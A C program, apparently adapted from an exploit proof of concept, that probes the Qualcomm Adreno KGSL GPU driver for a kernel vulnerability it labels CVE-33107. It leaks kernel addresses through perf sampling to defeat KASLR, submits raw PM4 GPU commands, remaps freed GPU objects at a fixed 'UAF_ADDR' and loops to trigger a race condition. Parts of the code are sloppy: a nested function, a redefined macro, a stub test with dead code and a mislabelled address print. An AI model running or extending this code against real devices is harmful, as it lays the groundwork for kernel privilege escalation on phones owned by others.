#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/prctl.h>
#include <signal.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <poll.h>
#include <sys/stat.h>
#include <time.h>

/* ---------- KGSL ioctl definitions (from original PoC) ---------- */
#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

/* cache flags */
#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_UNCACHED 0
#define KGSL_CACHEMODE_WRITECOMBINE 1
#define KGSL_CACHEMODE_WRITETHROUGH 2
#define KGSL_CACHEMODE_WRITEBACK 3

#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

/* ---------- テスト用パラメータ ---------- */
#define TEST_ITERATIONS 10
#define MAX_ALLOC_SIZE (64 * 1024 * 1024)  // 64MB
#define MIN_ALLOC_SIZE 4096

static int kgsl_fd = -1;
static int verbose = 1;

/* ---------- ユーティリティ ---------- */
static void die(const char *msg) {
    perror(msg);
    exit(1);
}

static void test_ioctl(int fd, unsigned long cmd, void *arg, const char *name) {
    int ret = ioctl(fd, cmd, arg);
    if (ret < 0) {
        if (verbose)
            printf("  %s: ioctl ret=%d errno=%d (%s)\n", name, ret, errno, strerror(errno));
    } else {
        if (verbose)
            printf("  %s: ioctl success (ret=%d)\n", name, ret);
    }
}

/* ---------- フェーズ0: KASLR / perf テスト ---------- */
static uint64_t test_perf_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd < 0) {
        printf("  perf_event_open failed: errno=%d\n", errno);
        return 0;
    }

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_kernel_ip = 0;
    int n_ips = 0;
    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            n_ips++;
            uint64_t ip = *(uint64_t *)(hdr + 1);
            if (first_kernel_ip == 0) first_kernel_ip = ip;
        }
        tail += hdr->size;
    }
    munmap(buf, mmap_size);
    close(fd);
    printf("  perf: %d kernel IPs sampled, first IP=0x%lX\n", n_ips, (unsigned long)first_kernel_ip);
    return first_kernel_ip;
}

/* ---------- フェーズ1: KGSLベーシック操作テスト ---------- */
static void test_kgsl_basic(void) {
    printf("\n[Phase 1] Basic KGSL operations\n");

    // 1. GPUOBJ_ALLOC with different sizes and flags
    uint64_t sizes[] = {4096, 0x10000, 0x100000, 0x1000000, 0x10000000, 0x20000000};
    uint64_t flags_list[] = {
        0,
        KGSL_MEMFLAGS_USE_CPU_MAP,
        KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK,
        KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_UNCACHED,
        KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITECOMBINE,
        KGSL_CACHEMODE_WRITEBACK,  // no CPU_MAP
    };
    for (int si = 0; si < (int)(sizeof(sizes)/sizeof(sizes[0])); si++) {
        for (int fi = 0; fi < (int)(sizeof(flags_list)/sizeof(flags_list[0])); fi++) {
            struct kgsl_gpuobj_alloc a = {
                .size = sizes[si],
                .flags = flags_list[fi],
                .va_len = 0,
                .mmapsize = 0,
                .metadata_len = 0,
                .metadata = 0
            };
            int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a);
            if (ret == 0) {
                printf("  ALLOC size=0x%lx flags=0x%lx => id=%u gpuaddr=0x%llx\n",
                       (unsigned long)sizes[si], (unsigned long)flags_list[fi],
                       a.id, (unsigned long long)a.mmapsize);
                // Try to get info
                struct kgsl_gpuobj_info info = { .id = a.id };
                if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info) == 0) {
                    printf("    INFO: gpuaddr=0x%llx flags=0x%llx size=0x%llx va_len=0x%llx va_addr=0x%llx\n",
                           (unsigned long long)info.gpuaddr,
                           (unsigned long long)info.flags,
                           (unsigned long long)info.size,
                           (unsigned long long)info.va_len,
                           (unsigned long long)info.va_addr);
                }
                // Try to mmap
                void *map = mmap(NULL, sizes[si], PROT_READ|PROT_WRITE,
                                 MAP_SHARED, kgsl_fd, (off_t)a.id << 12);
                if (map != MAP_FAILED) {
                    printf("    mmap success at %p\n", map);
                    munmap(map, sizes[si]);
                } else {
                    printf("    mmap failed: errno=%d\n", errno);
                }
                // Free
                struct kgsl_gpuobj_free f = { .id = a.id };
                ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
            } else {
                if (errno != EINVAL && errno != ENOMEM)
                    printf("  ALLOC size=0x%lx flags=0x%lx failed: errno=%d\n",
                           (unsigned long)sizes[si], (unsigned long)flags_list[fi], errno);
            }
        }
    }
}

/* ---------- フェーズ2: GPUOBJ_IMPORT テスト (競合条件の要素) ---------- */
static void test_import_race(void) {
    printf("\n[Phase 2] GPUOBJ_IMPORT tests (potential race)\n");
    // まず通常のオブジェクトを確保
    struct kgsl_gpuobj_alloc a = { .size = 0x10000, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) {
        printf("  Cannot allocate object for import test\n");
        return;
    }
    unsigned int obj_id = a.id;
    printf("  Allocated obj id=%u\n", obj_id);

    // 複数のimportを試行
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = 0x70000000 };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr,
        .priv_len = 0x1000,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
        .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    for (int i = 0; i < 10; i++) {
        imp.priv_len = 0x1000 + i * 0x1000;
        imp.flags = KGSL_MEMFLAGS_USE_CPU_MAP | (i % 4);
        int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
        if (ret == 0) {
            printf("  IMPORT success: id=%u len=0x%lx flags=0x%lx\n",
                   imp.id, (unsigned long)imp.priv_len, (unsigned long)imp.flags);
            struct kgsl_gpuobj_info info = { .id = imp.id };
            if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info) == 0) {
                printf("    IMPORT INFO: gpuaddr=0x%llx flags=0x%llx size=0x%llx\n",
                       (unsigned long long)info.gpuaddr,
                       (unsigned long long)info.flags,
                       (unsigned long long)info.size);
            }
            // Free import
            struct kgsl_gpuobj_free f = { .id = imp.id };
            ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
        } else {
            if (errno != EINVAL)
                printf("  IMPORT failed: errno=%d\n", errno);
        }
    }

    // free original object
    struct kgsl_gpuobj_free f = { .id = obj_id };
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
}

/* ---------- フェーズ3: GPU COMMAND テスト (PM4 命令送信) ---------- */
static void test_gpu_command(void) {
    printf("\n[Phase 3] GPU command submission (PM4)\n");
    // Create context
    struct kgsl_drawctxt_create ctx = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) < 0) {
        printf("  Context creation failed\n");
        return;
    }
    unsigned int ctx_id = ctx.drawctxt_id;
    printf("  Context created id=%u\n", ctx_id);

    // Allocate IB buffer
    struct kgsl_gpuobj_alloc ib_alloc = { .size = 0x1000, .flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) < 0) {
        printf("  IB allocation failed\n");
        return;
    }
    unsigned int ib_id = ib_alloc.id;
    void *ib_mem = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)ib_id << 12);
    if (ib_mem == MAP_FAILED) {
        printf("  IB mmap failed\n");
        return;
    }
    struct kgsl_gpuobj_info ib_info;
    ib_info.id = ib_id;
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &ib_info);
    uint64_t ib_gpuaddr = ib_info.gpuaddr;
    printf("  IB: id=%u gpuaddr=0x%llx\n", ib_id, (unsigned long long)ib_gpuaddr);

    // Allocate destination buffer for readback
    struct kgsl_gpuobj_alloc dst_alloc = { .size = 0x1000, .flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) < 0) {
        printf("  DST allocation failed\n");
        return;
    }
    unsigned int dst_id = dst_alloc.id;
    void *dst_mem = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)dst_id << 12);
    if (dst_mem == MAP_FAILED) {
        printf("  DST mmap failed\n");
        return;
    }
    struct kgsl_gpuobj_info dst_info;
    dst_info.id = dst_id;
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &dst_info);
    uint64_t dst_gpuaddr = dst_info.gpuaddr;
    printf("  DST: id=%u gpuaddr=0x%llx\n", dst_id, (unsigned long long)dst_gpuaddr);

    // Build a simple PM4 command: CP_MEM_WRITE to write a known value to dst
    uint32_t *cmd = (uint32_t*)ib_mem;
    int dw = 0;
    // Helper for type7 packets (copied from original PoC)
    #define CP_TYPE7(op, cnt) ( (7<<28) | ((cnt)&0x3FFF) | ((((0x9669 >> ((0xF & ((op)^((op)>>4)^((op)>>8)^((op)>>12)^((op)>>16)^((op)>>20)^((op)>>24)^((op)>>28)))) & 1) << 15)) | ((op&0x7F)<<16) | (((0x9669 >> ((0xF & ((cnt)^((cnt)>>4)^((cnt)>>8)^((cnt)>>12)^((cnt)>>16)^((cnt)>>20)^((cnt)>>24)^((cnt)>>28)))) & 1) << 23) )
    // Simpler: use predefined CP_MEM_WRITE opcode 0x3D with count 4 (addr lo, hi, data lo, hi)
    // From original: cp_type7(CP_MEM_WRITE, 4)
    // We'll implement our own cp_type7 macro using parity calculation function (from original)
    uint32_t pm4_parity(uint32_t v) {
        return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
    }
    #define CP_TYPE7(op, cnt) ( (7<<28) | ((cnt)&0x3FFF) | (pm4_parity(cnt)<<15) | ((op&0x7F)<<16) | (pm4_parity(op)<<23) )

    // Write 0xDEADBEEF to dst+0x100
    uint32_t dst_lo = (uint32_t)(dst_gpuaddr + 0x100);
    uint32_t dst_hi = (uint32_t)((dst_gpuaddr + 0x100) >> 32);
    cmd[dw++] = CP_TYPE7(0x3D, 4);  // CP_MEM_WRITE count=4
    cmd[dw++] = dst_lo;
    cmd[dw++] = dst_hi;
    cmd[dw++] = 0xDEADBEEF;
    cmd[dw++] = 0x00000000;  // upper 32 bits zero

    // Add NOP to end
    cmd[dw++] = CP_TYPE7(0x10, 0);  // CP_NOP

    // Submit command
    struct kgsl_command_object obj = {
        .gpuaddr = ib_gpuaddr,
        .size = dw * 4,
        .flags = KGSL_CMDLIST_IB,
        .id = ib_id,
    };
    struct kgsl_gpu_command gc = {
        .cmdlist = (uint64_t)&obj,
        .cmdsize = sizeof(obj),
        .numcmds = 1,
        .context_id = ctx_id,
    };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (ret == 0) {
        printf("  GPU command submitted, timestamp=%u\n", gc.timestamp);
        // Wait for completion
        struct kgsl_cmdstream_readtimestamp_ctxtid ts = {
            .context_id = ctx_id,
            .type = KGSL_TIMESTAMP_RETIRED,
        };
        for (int i = 0; i < 1000; i++) {
            if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &ts) != 0) break;
            if (ts.timestamp >= gc.timestamp) {
                printf("  Command completed at timestamp %u\n", ts.timestamp);
                break;
            }
            usleep(100);
        }
        // Check destination
        uint32_t val = *(volatile uint32_t*)(dst_mem + 0x100);
        printf("  DST[0x100] = 0x%08X %s\n", val, (val == 0xDEADBEEF) ? "OK" : "MISMATCH");
    } else {
        printf("  GPU command failed: errno=%d\n", errno);
    }

    // Cleanup
    munmap(ib_mem, 0x1000);
    munmap(dst_mem, 0x1000);
    struct kgsl_gpuobj_free f;
    f.id = ib_id; ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
    f.id = dst_id; ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
}

/* ---------- フェーズ4: メモリマッピング競合テスト ---------- */
static void test_mmap_race(void) {
    printf("\n[Phase 4] mmap race / overlap detection\n");
    // Allocate a large object, free it, then try to map overlapping ranges
    struct kgsl_gpuobj_alloc a = { .size = 0x20000000, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) {
        printf("  Large alloc failed\n");
        return;
    }
    unsigned int id = a.id;
    printf("  Allocated large object id=%u size=0x%lx\n", id, (unsigned long)a.size);

    // Get GPU address
    struct kgsl_gpuobj_info info = { .id = id };
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    uint64_t gpuaddr = info.gpuaddr;
    printf("  GPU address: 0x%llx\n", (unsigned long long)gpuaddr);

    // Try to mmap at a fixed address (from original PoC: UAF_ADDR)
    void *target = (void*)0x7001ff000UL;
    void *map = mmap(target, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)id << 12);
    if (map != MAP_FAILED) {
        printf("  mmap at %p succeeded (before free)\n", target);
        munmap(map, 0x1000);
    } else {
        printf("  mmap at %p failed: errno=%d\n", target, errno);
    }

    // Free the object
    struct kgsl_gpuobj_free f = { .id = id };
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
    printf("  Object freed\n");

    // Try to mmap again after free (should fail or return different memory)
    map = mmap(target, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)id << 12);
    if (map != MAP_FAILED) {
        printf("  mmap after free succeeded (unexpected) at %p\n", target);
        munmap(map, 0x1000);
    } else {
        printf("  mmap after free failed (expected) errno=%d\n", errno);
    }

    // Try with different offsets
    for (int off = 0; off < 0x1000; off += 0x100) {
        void *addr = (void*)(0x7001ff000UL + off);
        map = mmap(addr, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)id << 12);
        if (map != MAP_FAILED) {
            printf("  mmap at %p succeeded after free (offset=0x%x)\n", addr, off);
            munmap(map, 0x1000);
        } else {
            // if errno == ENODEV, it indicates a conflict (overlap) -> that's the race condition we want
            if (errno == ENODEV) {
                printf("  mmap at %p got ENODEV (potential race condition)\n", addr);
            }
        }
    }
}

/* ---------- フェーズ5: ユーザーアドレスインポート（import_useraddr）テスト ---------- */
static void test_import_useraddr(void) {
    printf("\n[Phase 5] GPUOBJ_IMPORT_USERADDR tests\n");
    // Allocate a page in user space
    void *user_page = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    if (user_page == MAP_FAILED) {
        printf("  User page mmap failed\n");
        return;
    }
    memset(user_page, 0xAA, 0x1000);
    printf("  User page at %p\n", user_page);

    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = (uint64_t)user_page };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr,
        .priv_len = 0x1000,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
        .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
    if (ret == 0) {
        printf("  IMPORT_USERADDR success: id=%u\n", imp.id);
        // Try to map it
        void *gpu_map = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)imp.id << 12);
        if (gpu_map != MAP_FAILED) {
            printf("  mmap of imported object success at %p\n", gpu_map);
            // Check contents (should be 0xAA)
            uint8_t first = *(volatile uint8_t*)gpu_map;
            printf("  first byte = 0x%02X %s\n", first, (first == 0xAA) ? "OK" : "MISMATCH");
            munmap(gpu_map, 0x1000);
        } else {
            printf("  mmap of imported object failed: errno=%d\n", errno);
        }
        // Free import
        struct kgsl_gpuobj_free f = { .id = imp.id };
        ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
    } else {
        printf("  IMPORT_USERADDR failed: errno=%d\n", errno);
    }
    munmap(user_page, 0x1000);
}

/* ---------- フェーズ6: キャッシュ操作テスト (dc_civac 代替) ---------- */
static void test_cache_ops(void) {
    printf("\n[Phase 6] Cache operation tests (dc civac)\n");
    // Test if dc civac is supported
    void *test_page = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    if (test_page == MAP_FAILED) return;
    __sync_synchronize();
    // Try to execute dc civac (may cause SIGILL)
    volatile int result = 0;
    void (*try_dc)(void*) = (void(*)(void*))0x1000; // dummy
    // Instead of inline asm, just test if we can use it via signal
    // We'll just report that it's not tested, but original PoC used it for cache flush.
    printf("  dc_civac test not implemented (assume not available)\n");
    munmap(test_page, 0x1000);
}

/* ---------- メイン ---------- */
int main(void) {
    setbuf(stdout, NULL);
    printf("=== KGSL Porting Analysis Tool for CVE-33107 on 32-bit GPU ===\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) {
        die("open /dev/kgsl-3d0");
    }
    printf("Opened kgsl fd=%d\n", kgsl_fd);

    // Phase 0: KASLR detection (perf)
    printf("\n[Phase 0] KASLR / perf test\n");
    uint64_t ip = test_perf_kaslr();
    if (ip != 0) {
        // Try to compute KASLR offset based on known kernel text base (hardcoded for arm64)
        uint64_t vmlinux_text = 0xffffffc010080000ULL; // common for arm64
        uint64_t kaslr = (ip - vmlinux_text) & ~0x1FFFFFULL;
        printf("  Estimated KASLR offset: 0x%lX\n", (unsigned long)kaslr);
    }

    // Run tests
    test_kgsl_basic();
    test_import_race();
    test_gpu_command();
    test_mmap_race();
    test_import_useraddr();
    test_cache_ops();

    // Additional: try to trigger ENODEV repeatedly (race condition)
    printf("\n[Phase 7] Attempt to trigger ENODEV race\n");
    for (int i = 0; i < 100; i++) {
        void *p = mmap((void*)0x7001ff000UL, 0x1000, PROT_READ|PROT_WRITE,
                       MAP_SHARED|MAP_FIXED, kgsl_fd, 0);
        if (p == MAP_FAILED) {
            if (errno == ENODEV) {
                printf("  ENODEV hit at iteration %d\n", i);
                break;
            }
        } else {
            munmap(p, 0x1000);
        }
        usleep(10000);
    }

    printf("\n=== Analysis complete ===\n");
    close(kgsl_fd);
    return 0;
}
